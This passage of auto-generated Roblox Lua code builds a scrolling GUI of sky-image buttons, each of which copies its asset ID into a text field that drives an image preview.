		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton53 = Instance.new("ImageButton")
ImageButton53.Name = "ImageButton"
ImageButton53.Image = "rbxassetid://5456914992"
ImageButton53.ImageContent = Content.fromUri("rbxassetid://5456914992")
ImageButton53.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton53.BackgroundTransparency = 1
ImageButton53.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton53.BorderSizePixel = 0
ImageButton53.Size = UDim2.new(0, 73, 0, 62)
ImageButton53.Parent = ScrollingFrame

local LocalScript67 = Instance.new("Folder")
LocalScript67.Name = "LocalScript"
LocalScript67.Parent = ImageButton53
__S[#__S + 1] = function(...)
local script = LocalScript67
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton54 = Instance.new("ImageButton")
ImageButton54.Name = "ImageButton"
ImageButton54.Image = "rbxassetid://16896396212"
ImageButton54.ImageContent = Content.fromUri("rbxassetid://16896396212")
ImageButton54.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton54.BackgroundTransparency = 1
ImageButton54.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton54.BorderSizePixel = 0
ImageButton54.Size = UDim2.new(0, 73, 0, 62)
R[150] = ImageButton54
ImageButton54.Parent = ScrollingFrame


end
do -- chunk 2/6
local LocalScript = Instance.new("Folder")
LocalScript.Name = "LocalScript"
LocalScript.Parent = R[150]
__S[#__S + 1] = function(...)
local script = LocalScript
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton = Instance.new("ImageButton")
ImageButton.Name = "ImageButton"
ImageButton.Image = "rbxassetid://9835676490"
ImageButton.ImageContent = Content.fromUri("rbxassetid://9835676490")
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.BackgroundTransparency = 1
ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Size = UDim2.new(0, 73, 0, 62)
ImageButton.Parent = R[42]

local LocalScript2 = Instance.new("Folder")
LocalScript2.Name = "LocalScript"
LocalScript2.Parent = ImageButton
__S[#__S + 1] = function(...)
local script = LocalScript2
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton2 = Instance.new("ImageButton")
ImageButton2.Name = "ImageButton"
ImageButton2.Image = "rbxassetid://11392905305"
ImageButton2.ImageContent = Content.fromUri("rbxassetid://11392905305")
ImageButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton2.BackgroundTransparency = 1
ImageButton2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton2.BorderSizePixel = 0
ImageButton2.Size = UDim2.new(0, 73, 0, 62)
ImageButton2.Parent = R[42]

local LocalScript3 = Instance.new("Folder")
LocalScript3.Name = "LocalScript"
LocalScript3.Parent = ImageButton2
__S[#__S + 1] = function(...)
local script = LocalScript3
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton3 = Instance.new("ImageButton")
ImageButton3.Name = "ImageButton"
ImageButton3.Image = "rbxassetid://92156141446654"
ImageButton3.ImageContent = Content.fromUri("rbxassetid://92156141446654")
ImageButton3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton3.BackgroundTransparency = 1
ImageButton3.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton3.BorderSizePixel = 0
ImageButton3.Size = UDim2.new(0, 73, 0, 62)
ImageButton3.Parent = R[42]

local LocalScript4 = Instance.new("Folder")
LocalScript4.Name = "LocalScript"
LocalScript4.Parent = ImageButton3
__S[#__S + 1] = function(...)
local script = LocalScript4
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton4 = Instance.new("ImageButton")
ImageButton4.Name = "ImageButton"
ImageButton4.Image = "rbxassetid://12500046511"
ImageButton4.ImageContent = Content.fromUri("rbxassetid://12500046511")
ImageButton4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton4.BackgroundTransparency = 1
ImageButton4.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton4.BorderSizePixel = 0
ImageButton4.Size = UDim2.new(0, 73, 0, 62)
ImageButton4.Parent = R[42]

local LocalScript5 = Instance.new("Folder")
LocalScript5.Name = "LocalScript"
LocalScript5.Parent = ImageButton4
__S[#__S + 1] = function(...)
local script = LocalScript5
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton5 = Instance.new("ImageButton")
ImageButton5.Name = "ImageButton"
ImageButton5.Image = "rbxassetid://117203540688853"
ImageButton5.ImageContent = Content.fromUri("rbxassetid://117203540688853")
ImageButton5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton5.BackgroundTransparency = 1
ImageButton5.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton5.BorderSizePixel = 0
ImageButton5.Size = UDim2.new(0, 73, 0, 62)
ImageButton5.Parent = R[42]

local LocalScript6 = Instance.new("Folder")
LocalScript6.Name = "LocalScript"
LocalScript6.Parent = ImageButton5
__S[#__S + 1] = function(...)
local script = LocalScript6
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton6 = Instance.new("ImageButton")
ImageButton6.Name = "ImageButton"
ImageButton6.Image = "rbxassetid://278201190"
ImageButton6.ImageContent = Content.fromUri("rbxassetid://278201190")
ImageButton6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton6.BackgroundTransparency = 1
ImageButton6.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton6.BorderSizePixel = 0
ImageButton6.Size = UDim2.new(0, 73, 0, 62)
ImageButton6.Parent = R[42]

local LocalScript7 = Instance.new("Folder")
LocalScript7.Name = "LocalScript"
LocalScript7.Parent = ImageButton6
__S[#__S + 1] = function(...)
local script = LocalScript7
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton7 = Instance.new("ImageButton")
ImageButton7.Name = "ImageButton"
ImageButton7.Image = "rbxassetid://10973546714"
ImageButton7.ImageContent = Content.fromUri("rbxassetid://10973546714")
ImageButton7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton7.BackgroundTransparency = 1
ImageButton7.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton7.BorderSizePixel = 0
ImageButton7.Size = UDim2.new(0, 73, 0, 62)
ImageButton7.Parent = R[42]

local LocalScript8 = Instance.new("Folder")
LocalScript8.Name = "LocalScript"
LocalScript8.Parent = ImageButton7
__S[#__S + 1] = function(...)
local script = LocalScript8
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton8 = Instance.new("ImageButton")
ImageButton8.Name = "ImageButton"
ImageButton8.Image = "rbxassetid://97056906397234"
ImageButton8.ImageContent = Content.fromUri("rbxassetid://97056906397234")
ImageButton8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton8.BackgroundTransparency = 1
ImageButton8.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton8.BorderSizePixel = 0
ImageButton8.Size = UDim2.new(0, 73, 0, 62)
ImageButton8.Parent = R[42]

local LocalScript9 = Instance.new("Folder")
LocalScript9.Name = "LocalScript"
LocalScript9.Parent = ImageButton8
__S[#__S + 1] = function(...)
local script = LocalScript9
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton9 = Instance.new("ImageButton")
ImageButton9.Name = "ImageButton"
ImageButton9.Image = "rbxassetid://5499986943"
ImageButton9.ImageContent = Content.fromUri("rbxassetid://5499986943")
ImageButton9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton9.BackgroundTransparency = 1
ImageButton9.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton9.BorderSizePixel = 0
ImageButton9.Size = UDim2.new(0, 73, 0, 62)
ImageButton9.Parent = R[42]

local LocalScript10 = Instance.new("Folder")
LocalScript10.Name = "LocalScript"
LocalScript10.Parent = ImageButton9
__S[#__S + 1] = function(...)
local script = LocalScript10
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton10 = Instance.new("ImageButton")
ImageButton10.Name = "ImageButton"
ImageButton10.Image = "rbxassetid://5225783759"
ImageButton10.ImageContent = Content.fromUri("rbxassetid://5225783759")
ImageButton10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton10.BackgroundTransparency = 1
ImageButton10.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton10.BorderSizePixel = 0
ImageButton10.Size = UDim2.new(0, 73, 0, 62)
ImageButton10.Parent = R[42]

local LocalScript11 = Instance.new("Folder")
LocalScript11.Name = "LocalScript"
LocalScript11.Parent = ImageButton10
__S[#__S + 1] = function(...)
local script = LocalScript11
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton11 = Instance.new("ImageButton")
ImageButton11.Name = "ImageButton"
ImageButton11.Image = "rbxassetid://96293852335430"
ImageButton11.ImageContent = Content.fromUri("rbxassetid://96293852335430")
ImageButton11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton11.BackgroundTransparency = 1
ImageButton11.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton11.BorderSizePixel = 0
ImageButton11.Size = UDim2.new(0, 73, 0, 62)
ImageButton11.Parent = R[42]

local LocalScript12 = Instance.new("Folder")
LocalScript12.Name = "LocalScript"
LocalScript12.Parent = ImageButton11
__S[#__S + 1] = function(...)
local script = LocalScript12
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton12 = Instance.new("ImageButton")
ImageButton12.Name = "ImageButton"
ImageButton12.Image = "rbxassetid://100381875734079"
ImageButton12.ImageContent = Content.fromUri("rbxassetid://100381875734079")
ImageButton12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton12.BackgroundTransparency = 1
ImageButton12.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton12.BorderSizePixel = 0
ImageButton12.Size = UDim2.new(0, 73, 0, 62)
ImageButton12.Parent = R[42]

local LocalScript13 = Instance.new("Folder")
LocalScript13.Name = "LocalScript"
LocalScript13.Parent = ImageButton12
__S[#__S + 1] = function(...)
local script = LocalScript13
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton13 = Instance.new("ImageButton")
ImageButton13.Name = "ImageButton"
ImageButton13.Image = "rbxassetid://110582834250785"
ImageButton13.ImageContent = Content.fromUri("rbxassetid://110582834250785")
ImageButton13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton13.BackgroundTransparency = 1
ImageButton13.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton13.BorderSizePixel = 0
ImageButton13.Size = UDim2.new(0, 73, 0, 62)
ImageButton13.Parent = R[42]

local LocalScript14 = Instance.new("Folder")
LocalScript14.Name = "LocalScript"
LocalScript14.Parent = ImageButton13
__S[#__S + 1] = function(...)
local script = LocalScript14
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton14 = Instance.new("ImageButton")
ImageButton14.Name = "ImageButton"
ImageButton14.Image = "rbxassetid://15436765569"
ImageButton14.ImageContent = Content.fromUri("rbxassetid://15436765569")
ImageButton14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton14.BackgroundTransparency = 1
ImageButton14.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton14.BorderSizePixel = 0
ImageButton14.Size = UDim2.new(0, 73, 0, 62)
ImageButton14.Parent = R[42]

local LocalScript15 = Instance.new("Folder")
LocalScript15.Name = "LocalScript"
LocalScript15.Parent = ImageButton14
__S[#__S + 1] = function(...)
local script = LocalScript15
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton15 = Instance.new("ImageButton")
ImageButton15.Name = "ImageButton"
ImageButton15.Image = "rbxassetid://5027821948"
ImageButton15.ImageContent = Content.fromUri("rbxassetid://5027821948")
ImageButton15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton15.BackgroundTransparency = 1
ImageButton15.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton15.BorderSizePixel = 0
ImageButton15.Size = UDim2.new(0, 73, 0, 62)
ImageButton15.Parent = R[42]

local LocalScript16 = Instance.new("Folder")
LocalScript16.Name = "LocalScript"
LocalScript16.Parent = ImageButton15
__S[#__S + 1] = function(...)
local script = LocalScript16
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton16 = Instance.new("ImageButton")
ImageButton16.Name = "ImageButton"
ImageButton16.Image = "rbxassetid://124557192614031"
ImageButton16.ImageContent = Content.fromUri("rbxassetid://124557192614031")
ImageButton16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton16.BackgroundTransparency = 1
ImageButton16.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton16.BorderSizePixel = 0
ImageButton16.Size = UDim2.new(0, 73, 0, 62)
ImageButton16.Parent = R[42]

local LocalScript17 = Instance.new("Folder")
LocalScript17.Name = "LocalScript"
LocalScript17.Parent = ImageButton16
__S[#__S + 1] = function(...)
local script = LocalScript17
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton17 = Instance.new("ImageButton")
ImageButton17.Name = "ImageButton"
ImageButton17.Image = "rbxassetid://11503672257"
ImageButton17.ImageContent = Content.fromUri("rbxassetid://11503672257")
ImageButton17.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton17.BackgroundTransparency = 1
ImageButton17.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton17.BorderSizePixel = 0
ImageButton17.Size = UDim2.new(0, 73, 0, 62)
ImageButton17.Parent = R[42]

local LocalScript18 = Instance.new("Folder")
LocalScript18.Name = "LocalScript"
LocalScript18.Parent = ImageButton17
__S[#__S + 1] = function(...)
local script = LocalScript18
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton18 = Instance.new("ImageButton")
ImageButton18.Name = "ImageButton"
ImageButton18.Image = "rbxassetid://98440275229105"
ImageButton18.ImageContent = Content.fromUri("rbxassetid://98440275229105")
ImageButton18.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton18.BackgroundTransparency = 1
ImageButton18.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton18.BorderSizePixel = 0
ImageButton18.Size = UDim2.new(0, 73, 0, 62)
ImageButton18.Parent = R[42]

local LocalScript19 = Instance.new("Folder")
LocalScript19.Name = "LocalScript"
LocalScript19.Parent = ImageButton18
__S[#__S + 1] = function(...)
local script = LocalScript19
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton19 = Instance.new("ImageButton")
ImageButton19.Name = "ImageButton"
ImageButton19.Image = "rbxassetid://142285971"
ImageButton19.ImageContent = Content.fromUri("rbxassetid://142285971")
ImageButton19.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton19.BackgroundTransparency = 1
ImageButton19.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton19.BorderSizePixel = 0
ImageButton19.Size = UDim2.new(0, 73, 0, 62)
ImageButton19.Parent = R[42]

local LocalScript20 = Instance.new("Folder")
LocalScript20.Name = "LocalScript"
LocalScript20.Parent = ImageButton19
__S[#__S + 1] = function(...)
local script = LocalScript20
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton20 = Instance.new("ImageButton")
ImageButton20.Name = "ImageButton"
ImageButton20.Image = "rbxassetid://4705269490"
ImageButton20.ImageContent = Content.fromUri("rbxassetid://4705269490")
ImageButton20.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton20.BackgroundTransparency = 1
ImageButton20.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton20.BorderSizePixel = 0
ImageButton20.Size = UDim2.new(0, 73, 0, 62)
ImageButton20.Parent = R[42]

local LocalScript21 = Instance.new("Folder")
LocalScript21.Name = "LocalScript"
LocalScript21.Parent = ImageButton20
__S[#__S + 1] = function(...)
local script = LocalScript21
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton21 = Instance.new("ImageButton")
ImageButton21.Name = "ImageButton"
ImageButton21.Image = "rbxassetid://12886904115"
ImageButton21.ImageContent = Content.fromUri("rbxassetid://12886904115")
ImageButton21.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton21.BackgroundTransparency = 1
ImageButton21.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton21.BorderSizePixel = 0
ImageButton21.Size = UDim2.new(0, 73, 0, 62)
ImageButton21.Parent = R[42]

local LocalScript22 = Instance.new("Folder")
LocalScript22.Name = "LocalScript"
LocalScript22.Parent = ImageButton21
__S[#__S + 1] = function(...)
local script = LocalScript22
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton22 = Instance.new("ImageButton")
ImageButton22.Name = "ImageButton"
ImageButton22.Image = "rbxassetid://94362608702821"
ImageButton22.ImageContent = Content.fromUri("rbxassetid://94362608702821")
ImageButton22.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton22.BackgroundTransparency = 1
ImageButton22.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton22.BorderSizePixel = 0
ImageButton22.Size = UDim2.new(0, 73, 0, 62)
ImageButton22.Parent = R[42]

local LocalScript23 = Instance.new("Folder")
LocalScript23.Name = "LocalScript"
LocalScript23.Parent = ImageButton22
__S[#__S + 1] = function(...)
local script = LocalScript23
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton23 = Instance.new("ImageButton")
ImageButton23.Name = "ImageButton"
ImageButton23.Image = "rbxassetid://115885657660241"
ImageButton23.ImageContent = Content.fromUri("rbxassetid://115885657660241")
ImageButton23.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton23.BackgroundTransparency = 1
ImageButton23.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton23.BorderSizePixel = 0
ImageButton23.Size = UDim2.new(0, 73, 0, 62)
ImageButton23.Parent = R[42]

local LocalScript24 = Instance.new("Folder")
LocalScript24.Name = "LocalScript"
LocalScript24.Parent = ImageButton23
__S[#__S + 1] = function(...)
local script = LocalScript24
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton24 = Instance.new("ImageButton")
ImageButton24.Name = "ImageButton"
ImageButton24.Image = "rbxassetid://73132811772878"
ImageButton24.ImageContent = Content.fromUri("rbxassetid://73132811772878")
ImageButton24.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton24.BackgroundTransparency = 1
ImageButton24.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton24.BorderSizePixel = 0
ImageButton24.Size = UDim2.new(0, 73, 0, 62)
ImageButton24.Parent = R[42]

local LocalScript25 = Instance.new("Folder")
LocalScript25.Name = "LocalScript"
LocalScript25.Parent = ImageButton24
__S[#__S + 1] = function(...)
local script = LocalScript25
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton25 = Instance.new("ImageButton")
ImageButton25.Name = "ImageButton"
ImageButton25.Image = "rbxassetid://7717718460"
ImageButton25.ImageContent = Content.fromUri("rbxassetid://7717718460")
ImageButton25.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton25.BackgroundTransparency = 1
ImageButton25.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton25.BorderSizePixel = 0
ImageButton25.Size = UDim2.new(0, 73, 0, 62)
ImageButton25.Parent = R[42]

local LocalScript26 = Instance.new("Folder")
LocalScript26.Name = "LocalScript"
LocalScript26.Parent = ImageButton25
__S[#__S + 1] = function(...)
local script = LocalScript26
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton26 = Instance.new("ImageButton")
ImageButton26.Name = "ImageButton"
ImageButton26.Image = "rbxassetid://4979702520"
ImageButton26.ImageContent = Content.fromUri("rbxassetid://4979702520")
ImageButton26.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton26.BackgroundTransparency = 1
ImageButton26.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton26.BorderSizePixel = 0
ImageButton26.Size = UDim2.new(0, 73, 0, 62)
ImageButton26.Parent = R[42]

local LocalScript27 = Instance.new("Folder")
LocalScript27.Name = "LocalScript"
LocalScript27.Parent = ImageButton26
__S[#__S + 1] = function(...)
local script = LocalScript27
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageButton27 = Instance.new("ImageButton")
ImageButton27.Name = "ImageButton"
ImageButton27.Image = "rbxassetid://118016452940592"
ImageButton27.ImageContent = Content.fromUri("rbxassetid://118016452940592")
ImageButton27.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton27.BackgroundTransparency = 1
ImageButton27.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageButton27.BorderSizePixel = 0
ImageButton27.Size = UDim2.new(0, 73, 0, 62)
ImageButton27.Parent = R[42]

local LocalScript28 = Instance.new("Folder")
LocalScript28.Name = "LocalScript"
LocalScript28.Parent = ImageButton27
__S[#__S + 1] = function(...)
local script = LocalScript28
local imageButton = script.Parent
local scrollingFrame = imageButton.Parent
local mainPage = scrollingFrame.Parent
local skyid = mainPage:WaitForChild("skyid")

imageButton.MouseButton1Click:Connect(function()

	local numericId = string.match(imageButton.Image, "%d+")

	if numericId then
		skyid.Text = numericId
	else
		skyid.Text = "No ID Found"
	end
end)

end

local ImageLabel = Instance.new("ImageLabel")
ImageLabel.Name = "ImageLabel"
ImageLabel.Image = "rbxassetid://0"
ImageLabel.ImageContent = Content.fromUri("rbxassetid://0")
ImageLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderColor3 = Color3.fromRGB(0, 242, 255)
ImageLabel.BorderSizePixel = 2
ImageLabel.Position = UDim2.new(1.66666663, 0, -0.376344085, 0)
ImageLabel.Size = UDim2.new(0, 100, 0, 100)
ImageLabel.Parent = R[36]

local LocalScript29 = Instance.new("Folder")
LocalScript29.Name = "LocalScript"
LocalScript29.Parent = ImageLabel
__S[#__S + 1] = function(...)
local script = LocalScript29
local imageLabel = script.Parent
local parentFrame = imageLabel.Parent
local skyIdButton = parentFrame:WaitForChild("skyid")

local function updateDecal()
	local rawText = skyIdButton.Text
	local cleanId = string.match(rawText, "%d+") 
	
	if cleanId then
		imageLabel.Image = "rbxassetid://" .. cleanId
	else
		imageLabel.Image = "" 
	end
end

updateDecal()
skyIdButton:GetPropertyChangedSignal("Text"):Connect(updateDecal)

end

local TextButton = Instance.new("TextButton")
